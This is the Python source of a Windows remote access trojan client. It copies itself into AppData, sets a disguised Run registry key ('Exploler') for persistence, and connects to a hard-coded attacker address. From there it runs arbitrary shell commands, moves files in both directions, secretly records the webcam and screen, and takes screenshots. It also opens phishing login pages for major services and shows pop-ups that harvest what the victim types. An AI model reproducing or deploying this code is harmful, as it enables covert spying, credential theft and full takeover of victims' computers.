from queue import Queue
import socket
import subprocess
import os,sys
import threading
import time
import webbrowser
from tkinter import *
import tkinter.messagebox as msgb

from PIL import ImageGrab
import numpy as np
import winreg as wr
import getpass

queue = Queue()
disk_c = []

def Copy():
        global user
        user = getpass.getuser()
        disk = ['C:','D:','E:','F:','H:','I:']
        for disk in disk:
            try:
                a = os.system(f'copy Client.pyw {disk}\\Users\\{user}\\AppData\\Local')
                if a == 1:
                    os.system(f'copy Client.pyw {disk}' + '\\')
                elif a == 0:
                    disk_c.append(disk)
            except:
                pass

def StartUp():
    con_reg = wr.ConnectRegistry(None, wr.HKEY_CURRENT_USER)
    targ = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        aKey = wr.OpenKey(con_reg, targ, 0, wr.KEY_WRITE)
        wr.SetValueEx(aKey, "Exploler", 0, wr.REG_SZ, f"{disk_c[0]}\\Users\\{user}\\AppData\\Local\\Client.pyw")
        return True
    except:
        return False
def FireWall():
    pass

Copy()
StartUp()
FireWall()


host = '192.168.77.132'
port = 9999
sock = socket.socket()

def Connecter():
    while True:
        try:
            print("connecting")
            sock.connect((host, port))
            break
        except:
            continue
Connecter()

def RunAccess():
    while True:
        recv_data = sock.recv(9999999)
        if recv_data.decode() == 'quit':
            break
        if recv_data.decode().startswith('cd'):
            try:
                os.chdir(recv_data.decode()[3:])
                sock.send(os.getcwd().encode())
            except Exception as e:
                sock.send(str(e).encode())
                continue
        elif '|*' in recv_data.decode():
            replace = recv_data.decode().replace('|*', '*')
            resplit = replace.split(" ")
            sub = subprocess.Popen(resplit, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            read = sub.stdout.read() + sub.stderr.read()
            sock.send(read + os.getcwd().encode())
        elif recv_data.decode().startswith('dir'):
            subp = subprocess.Popen(recv_data.decode(), shell=True, stdout=subprocess.PIPE)
            read = subp.stdout.readlines()
            for i in range(len(read)):
                sock.send(read[i])
        else:
            try:
                print(recv_data, 'Acc')
                sub = subprocess.Popen([recv_data.decode()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                read = sub.stdout.read()
                if read:
                    print("read")
                    sock.send(read + os.getcwd().encode())
                elif sub.stderr.read():
                    print("err")
                    subp = subprocess.Popen(recv_data.decode(), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)#type hey.txt
                    out = subp.stdout.read()
                    err = subp.stderr.read()
                    if b'is not recognized as an internal' in err:
                        sub = subprocess.Popen(["start",recv_data.decode()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        print("run")
                        sock.send(b'All Done')
                    else:
                        print('else')
                        readp = out + err
                        sock.send(readp + os.getcwd().encode())
                        
                else:
                    print("run")
                    sock.send(b'All Done')
            except:
                pass




def Upload():
    print('upload')
    exet = sock.recv(10)
    while True:
        try:
            a = sock.settimeout(15)
            recv = sock.recv(999999999)
            exe = exet.decode()
            if os.path.exists(f"Upload.{exe}.txt"):
                file = open('Upload.' + exe + '.txt', 'ab')
                file.write(recv)
                file.close()
            else:
                file = open('Upload.' + exe + '.txt', 'wb')
                file.write(recv)
                file.close()
        except socket.timeout:
            print('timeout')
            break
    sock.send(b'done')
    print('upload complete')
    e = exet.decode()
    os.system(f'rename Upload.{e}.txt Upload.{e}')
    return


def Download():
    while True:
        print("wait for u")
        data = sock.recv(99999999)
        print("Your File",data,"recived")
        if data.decode() == 'quit':
            break
        if data.decode().startswith('cd'):
            print("CD")
            try:
                os.chdir(data.decode()[3:])
                sock.send(os.getcwd().encode())
            except Exception as e:
                sock.send(str(e).encode())
                continue
        elif '|*' in data.decode():
            replace = data.decode().replace('|*', '*')
            resplit = replace.split(" ")
            sub = subprocess.Popen(resplit, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            read = sub.stdout.read() + sub.stderr.read()
            sock.send(read + os.getcwd().encode())
        elif data.decode().startswith('dir'):
            print('DIR')
            sub = subprocess.Popen([data.decode()], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            read = sub.stdout.readlines()
            for i in range(len(read)):
                sock.send(read[i])
            continue
        try:
            print("Checking complete")
            f = open(data.decode(), 'rb')
            read = f.readlines()
            b = len(read)
            print(b)
            print("data sendi")
            for i in range(len(read)):
                sock.send(read[i])
                b -= 1
                print(b)
                # print('sending', 'left', b)
            print('Finished')
        except:
            continue


def Record_cam():
    import cv2
    cam = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    vid = cv2.VideoWriter('output1.avi', fourcc, 10, (640, 480))
    print("REcord Cam")
    a = sock.recv(1024).decode()
    frames = int(a)
    inc = 0
    while inc <= frames:
        inc += 1
        ret, frame = cam.read()
        resize = cv2.resize(frame, (640, 480))
        vid.write(resize)
        key = cv2.waitKey(1)
        if key == 27:
            break
    sock.send("finished".encode())
    vid.release()
    cam.release()
    cv2.destroyAllWindows()


def Record_Screen():
    import cv2
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    vid = cv2.VideoWriter('Record1.avi', fourcc, 10, (900, 800))
    print("SCreeN ReCord")
    a = sock.recv(1024).decode()
    frames = int(a)
    inc = 0
    while inc <= frames:
        inc += 1
        img = ImageGrab.grab()
        img_np = np.array(img)
        resize = cv2.resize(img_np, (900, 800))
        vid.write(resize)
        cv2.waitKey(1)
    sock.send("finished".encode())
    vid.release()
    cv2.destroyAllWindows()


def ScreenShot():
    import time
    print("ScreenShot")
    times = sock.recv(2014)
    delay = sock.recv(2015)
    dela = delay.decode()
    coun = times.decode()
    c = 1
    while c <= int(coun):
        grab = ImageGrab.grab()
        save = "ScreenShot"+str(c)+'.jpg'
        grab.save(save)
        time.sleep(int(dela))
        c += 1
    sock.send(b"Finished")

def SE():
    def Phishing():
        typePhirec = sock.recv(1024)
        try:
            input_decode = int(typePhirec.decode())
            typePhi = {1:"facebook",2:"github",3:"google",4:"instafollowers",5:"instagram",6:"linkedin",7:"microsoft",8:"netflix",9:"pinterest",10:"protonmail",11:"snapchat",12:"spotify",13:"twitter",14:"wordpress",15:"yahoo"}
            joined = os.path.join("http://192.168.120.3/"+typePhi[input_decode],'login.html')
            webbrowser.open(joined)
        except:
            pass
    def AskQuestion():
        root = Tk()
        root.wm_attributes('-topmost',1)
        warning = sock.recv(2014).decode()
        question = sock.recv(2014).decode()
        yes_or_no = sock.recv(2014).decode()
        if yes_or_no == '1':
            answer = msgb.askyesno(warning,question)
            if answer == 'yes':
                file = open(warning+'.txt', 'w')
                file.write(str(answer))
                file.close()
            else:
                file = open(warning+'.txt', 'w')
                file.write(str(answer))
                file.close()
        else:
            label = Label(root,text=question)
            label.pack()
            root.title(warning)
            def clicked(ev):
                myans = entry.get()
                if myans:
                    file = open(warning+'.txt', 'w')
                    file.write(str(myans))
                    file.close()
                    root.destroy()
            entry = Entry(root, width=30)
            entry.pack()
            entry.bind("<Return>",clicked)
        root.mainloop()
    Ques_or_Phi = sock.recv(1024)
    if Ques_or_Phi.decode() == '1':
        Phishing()
    elif Ques_or_Phi.decode() == '2':
        AskQuestion()
if __name__ == '__main__':
    while True:
        print("Chossing")
        sock.setblocking(1)
        try:
            what = sock.recv(1024)
            if not what:
                break
            print("chossing",what)
            if what.decode() == '1':
                RunAccess()

            elif what.decode() == '2':
                upordw = sock.recv(1024)
                if upordw.decode() == '1':
                    Upload()
                else:
                    Download()
            elif what.decode() == '3':
                Record_cam()
            elif what.decode() == '4':
                Record_Screen()
            elif what.decode() == '5':
                ScreenShot()
            elif what.decode() == '6':
                SE()
            elif what.decode() == '99':
                close_options = sock.recv(1024)
                if close_options.decode() == '1':
                    break
                elif close_options.decode() == '2':
                    pass
        except:
            pass
